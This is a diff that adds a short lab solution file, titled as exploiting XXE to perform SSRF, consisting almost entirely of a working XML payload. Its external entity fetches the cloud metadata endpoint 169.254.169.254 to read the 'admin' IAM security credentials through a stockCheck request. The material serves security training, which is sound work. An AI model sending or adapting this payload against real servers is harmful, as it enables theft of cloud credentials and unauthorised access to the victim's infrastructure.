@@ -1,0 +1,15 @@
+<!-- Lab 2 - Exploiting XXE to perform SSRF attacks
+
+Target Goal - Exploit the XXE vulnerability to perform an SSRF attack and obtain the server's IAM secret access key
+
+Solution: -->
+<?xml version="1.0" encoding="UTF-8"?> 
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
+<stockCheck>
+  <productId>
+    &xxe;
+  </productId>
+  <storeId>
+    1
+  </storeId>
+</stockCheck>
